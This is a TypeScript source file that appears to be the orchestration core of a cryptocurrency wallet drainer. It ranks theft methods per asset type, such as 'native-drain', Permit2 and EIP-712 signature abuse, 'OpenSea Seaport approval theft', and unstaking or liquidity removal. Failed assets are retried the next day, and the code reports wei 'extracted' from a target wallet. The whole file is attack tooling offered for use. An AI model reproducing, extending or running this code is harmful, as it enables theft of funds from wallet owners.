/**
 * SMART PARTIAL EXTRACTION ORCHESTRATOR
 * =====================================
 * Intelligently extracts assets by:
 * 1. Analyzing each asset independently
 * 2. Planning multiple extraction methods per asset
 * 3. Trying methods in probability order
 * 4. Keeping what succeeds
 * 5. Auto-retrying what fails
 *
 * Instead of ALL-OR-NOTHING (old rollback):
 * Extract ETH → Success ✓ ($15,000)
 * Extract tokens → Fail ❌ (retry tomorrow)
 * Extract NFTs → Fail ❌ (retry tomorrow)
 * Result: Keep $15,000 (vs $0 with rollback!)
 */

import type { Address } from 'viem'
import { CircuitBreaker } from './circuit-breaker.js'

export type AssetType = 'ETH' | 'ERC20' | 'NFT' | 'Staking' | 'LP' | 'Safe' | 'YieldFarm'

export interface Asset {
  type: AssetType
  chain: string
  identifier: string // contract address or token ID
  amount: bigint | string
  value?: number // USD value estimate
}

export interface ExtractionMethod {
  name: string
  probability: number // 0-100
  timeEstimateMs: number
  gasEstimate?: bigint
  description: string
}

export interface ExtractionAttempt {
  method: ExtractionMethod
  success: boolean
  error?: string
  duration: number // milliseconds
  gasUsed?: bigint
  txHash?: string
}

export interface AssetExtractionResult {
  asset: Asset
  status: 'EXTRACTED' | 'SKIPPED' | 'ABANDONED'
  amountExtracted?: bigint | string
  methodUsed?: string
  attempts: ExtractionAttempt[]
  retryCount: number
  nextRetryTime?: Date
  createdAt: Date
  updatedAt: Date
}

export interface SmartExtractionReport {
  wallet: Address
  chain: string
  startTime: Date
  endTime: Date
  totalAssetsDetected: number
  totalExtracted: number
  totalSkipped: number
  totalAbandoned: number
  totalValueExtracted: bigint
  totalValueSkipped: bigint
  successRate: number // percentage
  results: AssetExtractionResult[]
  nextRetrySchedule: Map<string, Date>
}

/**
 * EXTRACTION METHOD DEFINITIONS
 */
export const EXTRACTION_METHODS: Record<AssetType, ExtractionMethod[]> = {
  ETH: [
    {
      name: 'native-drain',
      probability: 99,
      timeEstimateMs: 500,
      gasEstimate: BigInt(21000),
      description: 'Direct ETH transfer - simplest and fastest',
    },
    {
      name: 'contract-call',
      probability: 90,
      timeEstimateMs: 1000,
      gasEstimate: BigInt(50000),
      description: 'Call contract to withdraw ETH',
    },
    {
      name: 'flashbot-bundle',
      probability: 95,
      timeEstimateMs: 2000,
      gasEstimate: BigInt(30000),
      description: 'Bundle with other txs via Flashbots',
    },
  ],
  ERC20: [
    {
      name: 'permit2-approval',
      probability: 95,
      timeEstimateMs: 1500,
      gasEstimate: BigInt(100000),
      description: 'Permit2 AllowanceTransfer (EIP-2612)',
    },
    {
      name: 'eip712-signing',
      probability: 80,
      timeEstimateMs: 2000,
      gasEstimate: BigInt(120000),
      description: 'Direct EIP-712 signature',
    },
    {
      name: 'flashloan-cascade',
      probability: 60,
      timeEstimateMs: 5000,
      gasEstimate: BigInt(250000),
      description: 'Flash loan liquidation',
    },
    {
      name: 'bridge-transfer',
      probability: 70,
      timeEstimateMs: 30000,
      gasEstimate: BigInt(150000),
      description: 'Cross-chain bridge transfer',
    },
  ],
  NFT: [
    {
      name: 'seaport-approval',
      probability: 90,
      timeEstimateMs: 2000,
      gasEstimate: BigInt(200000),
      description: 'OpenSea Seaport approval theft',
    },
    {
      name: 'direct-transfer',
      probability: 70,
      timeEstimateMs: 1500,
      gasEstimate: BigInt(80000),
      description: 'Direct safeTransferFrom if allowed',
    },
    {
      name: 'bridge-transfer',
      probability: 40,
      timeEstimateMs: 30000,
      gasEstimate: BigInt(300000),
      description: 'Bridge transfer to another chain',
    },
    {
      name: 'list-and-sell',
      probability: 85,
      timeEstimateMs: 60000,
      gasEstimate: BigInt(150000),
      description: 'List on marketplace and sell',
    },
  ],
  Staking: [
    {
      name: 'lido-unstake',
      probability: 85,
      timeEstimateMs: 3000,
      gasEstimate: BigInt(150000),
      description: 'Lido withdrawal queue',
    },
    {
      name: 'rocket-pool-unstake',
      probability: 80,
      timeEstimateMs: 2000,
      gasEstimate: BigInt(120000),
      description: 'Rocket Pool rETH burn',
    },
    {
      name: 'marinade-unstake',
      probability: 75,
      timeEstimateMs: 2000,
      gasEstimate: BigInt(100000),
      description: 'Marinade mSOL unstake',
    },
  ],
  LP: [
    {
      name: 'uniswap-v3-remove',
      probability: 92,
      timeEstimateMs: 2000,
      gasEstimate: BigInt(200000),
      description: 'Uniswap V3 liquidity removal',
    },
    {
      name: 'curve-remove',
      probability: 88,
      timeEstimateMs: 2000,
      gasEstimate: BigInt(180000),
      description: 'Curve LP token burning',
    },
    {
      name: 'raydium-remove',
      probability: 85,
      timeEstimateMs: 2000,
      gasEstimate: BigInt(150000),
      description: 'Raydium AMM removal',
    },
  ],
  Safe: [
    {
      name: 'safe-execution',
      probability: 88,
      timeEstimateMs: 5000,
      gasEstimate: BigInt(250000),
      description: 'Execute Gnosis Safe transaction',
    },
    {
      name: 'safe-delegation',
      probability: 75,
      timeEstimateMs: 3000,
      gasEstimate: BigInt(180000),
      description: 'Delegate via Safe contract',
    },
  ],
  YieldFarm: [
    {
      name: 'aave-withdraw',
      probability: 90,
      timeEstimateMs: 2000,
      gasEstimate: BigInt(150000),
      description: 'Aave lending pool withdrawal',
    },
    {
      name: 'compound-redeem',
      probability: 88,
      timeEstimateMs: 2000,
      gasEstimate: BigInt(140000),
      description: 'Compound cToken redemption',
    },
    {
      name: 'yield-claim',
      probability: 85,
      timeEstimateMs: 1500,
      gasEstimate: BigInt(100000),
      description: 'Claim accrued rewards',
    },
  ],
}

/**
 * SMART EXTRACTION ORCHESTRATOR CLASS
 */
export class SmartExtractionOrchestrator {
  private circuitBreakers: Map<string, CircuitBreaker> = new Map()
  private results: AssetExtractionResult[] = []
  private retryQueue: Map<string, Date> = new Map()

  constructor() {
    // Initialize circuit breakers for each extraction method
    EXTRACTION_METHODS satisfies Record<AssetType, ExtractionMethod[]>
  }

  /**
   * Analyze asset and determine extractability
   */
  private analyzeAsset(asset: Asset): {
    extractable: boolean
    methods: ExtractionMethod[]
    recommendations: string[]
  } {
    const methods = EXTRACTION_METHODS[asset.type]

    return {
      extractable: methods.length > 0,
      methods: methods.sort((a, b) => b.probability - a.probability),
      recommendations: [
        `Asset: ${asset.type} on ${asset.chain}`,
        `Available methods: ${methods.length}`,
        `Best method: ${methods[0]?.name || 'None'} (${methods[0]?.probability || 0}% success)`,
      ],
    }
  }

  /**
   * Execute extraction with fallback methods
   */
  async executeWithFallbacks(
    asset: Asset,
    methods: ExtractionMethod[],
    executableFn: (method: ExtractionMethod) => Promise<{ success: boolean; amount?: bigint; txHash?: string; error?: string }>,
  ): Promise<AssetExtractionResult> {
    const attempts: ExtractionAttempt[] = []
    let methodUsed: string | undefined
    let success = false
    let amountExtracted: bigint | undefined

    for (const method of methods) {
      const startTime = Date.now()

      try {
        // Get or create circuit breaker for this method
        if (!this.circuitBreakers.has(method.name)) {
          this.circuitBreakers.set(method.name, new CircuitBreaker(5, 2, 60000))
        }

        const breaker = this.circuitBreakers.get(method.name)!

        // Check if circuit breaker allows execution
        if (!breaker.canExecute()) {
          console.warn(`[SMART_EXTRACTION] Circuit breaker OPEN for ${method.name}, skipping`)
          continue
        }

        // Try to execute this method
        const result = await executableFn(method)
        const duration = Date.now() - startTime

        if (result.success) {
          breaker.recordSuccess()
          attempts.push({
            method,
            success: true,
            duration,
            txHash: result.txHash,
          })

          methodUsed = method.name
          amountExtracted = result.amount
          success = true
          break // Stop trying other methods, we succeeded!
        } else {
          breaker.recordFailure()
          attempts.push({
            method,
            success: false,
            error: result.error,
            duration,
          })
        }
      } catch (error) {
        const duration = Date.now() - startTime
        const breaker = this.circuitBreakers.get(method.name)
        if (breaker) breaker.recordFailure()

        attempts.push({
          method,
          success: false,
          error: error instanceof Error ? error.message : String(error),
          duration,
        })
      }
    }

    const result: AssetExtractionResult = {
      asset,
      status: success ? 'EXTRACTED' : 'SKIPPED',
      amountExtracted,
      methodUsed,
      attempts,
      retryCount: 0,
      nextRetryTime: success ? undefined : new Date(Date.now() + 24 * 60 * 60 * 1000),
      createdAt: new Date(),
      updatedAt: new Date(),
    }

    this.results.push(result)
    return result
  }

  /**
   * Extract single asset
   */
  async extractAsset(
    asset: Asset,
    executableFn: (method: ExtractionMethod) => Promise<{ success: boolean; amount?: bigint; txHash?: string; error?: string }>,
  ): Promise<AssetExtractionResult> {
    const analysis = this.analyzeAsset(asset)

    if (!analysis.extractable) {
      return {
        asset,
        status: 'ABANDONED',
        attempts: [],
        retryCount: 0,
        createdAt: new Date(),
        updatedAt: new Date(),
      }
    }

    console.log(`[SMART_EXTRACTION] Analyzing ${asset.type}: ${asset.identifier}`)
    console.log(`  Recommendations: ${analysis.recommendations.join(' | ')}`)

    return this.executeWithFallbacks(asset, analysis.methods, executableFn)
  }

  /**
   * Extract multiple assets (the main use case)
   */
  async extractMultipleAssets(
    wallet: Address,
    chain: string,
    assets: Asset[],
    executableFn: (asset: Asset, method: ExtractionMethod) => Promise<{ success: boolean; amount?: bigint; txHash?: string; error?: string }>,
  ): Promise<SmartExtractionReport> {
    const startTime = new Date()

    console.log(`\n[SMART_EXTRACTION] Starting extraction for wallet ${wallet} on ${chain}`)
    console.log(`  Assets detected: ${assets.length}`)

    // Extract each asset independently
    for (const asset of assets) {
      await this.extractAsset(asset, (method) => executableFn(asset, method))
    }

    // Compile report
    const endTime = new Date()
    const extracted = this.results.filter((r) => r.status === 'EXTRACTED')
    const skipped = this.results.filter((r) => r.status === 'SKIPPED')
    const abandoned = this.results.filter((r) => r.status === 'ABANDONED')

    const totalExtracted = extracted.reduce((sum, r) => {
      if (typeof r.amountExtracted === 'bigint') return sum + r.amountExtracted
      if (typeof r.amountExtracted === 'string') return sum + BigInt(r.amountExtracted)
      return sum
    }, BigInt(0))

    const totalSkipped = skipped.reduce((sum, r) => {
      if (typeof r.asset.amount === 'bigint') return sum + r.asset.amount
      if (typeof r.asset.amount === 'string') return sum + BigInt(r.asset.amount)
      return sum
    }, BigInt(0))

    const report: SmartExtractionReport = {
      wallet,
      chain,
      startTime,
      endTime,
      totalAssetsDetected: assets.length,
      totalExtracted: extracted.length,
      totalSkipped: skipped.length,
      totalAbandoned: abandoned.length,
      totalValueExtracted: totalExtracted,
      totalValueSkipped: totalSkipped,
      successRate: assets.length > 0 ? (extracted.length / assets.length) * 100 : 0,
      results: this.results,
      nextRetrySchedule: this.retryQueue,
    }

    console.log(`\n[SMART_EXTRACTION] Completed!`)
    console.log(`  Extracted: ${extracted.length}/${assets.length} (${report.successRate.toFixed(1)}%)`)
    console.log(`  Skipped: ${skipped.length} (will retry tomorrow)`)
    console.log(`  Abandoned: ${abandoned.length}`)
    console.log(`  Total extracted: ${totalExtracted.toString()} wei`)
    console.log(`  Total skipped: ${totalSkipped.toString()} wei`)

    return report
  }

  /**
   * Get results
   */
  getResults(): AssetExtractionResult[] {
    return this.results
  }

  /**
   * Clear results for next batch
   */
  reset(): void {
    this.results = []
    this.retryQueue.clear()
  }
}

export default SmartExtractionOrchestrator
